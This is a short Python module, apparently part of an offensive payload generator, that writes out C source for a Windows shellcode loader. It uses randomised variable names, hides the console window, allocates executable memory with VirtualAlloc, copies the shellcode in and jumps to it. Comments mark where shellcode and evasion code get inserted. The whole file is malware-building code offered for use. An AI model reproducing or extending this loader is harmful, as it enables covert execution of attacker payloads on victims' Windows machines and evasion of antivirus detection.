from lib import gen

Shellcode = gen.Varname_Creator()
Hide_Window = gen.Varname_Creator()
Exec = gen.Varname_Creator()

def Start():

    Start_Code = "#include <windows.h>\n"
    Start_Code += "#include <stdio.h>\n"
    Start_Code += "#include <stdlib.h>\n"
    Start_Code += "#include <string.h>\n"
    Start_Code += "int main(int argc, char **argv) {"
    Start_Code += "char " + Shellcode + "[] = {"

    return Start_Code

# Adding shellcode

def Hide_Window_Console():

    Hide_Window_Console_Code = "};\nHWND " + Hide_Window + " = GetConsoleWindow();"
    Hide_Window_Console_Code += "ShowWindow(" + Hide_Window + ", SW_HIDE);"

    return Hide_Window_Console_Code

# Adding evasion code

def End():


    End_Code = "void *" + Exec + " = VirtualAlloc(0, sizeof " + Shellcode + ", MEM_COMMIT, PAGE_EXECUTE_READWRITE);"
    End_Code += "memcpy(" + Exec + ", " + Shellcode + ", sizeof " + Shellcode + ");"
    End_Code += "((void(*)())" + Exec + ")();}"

    return End_Code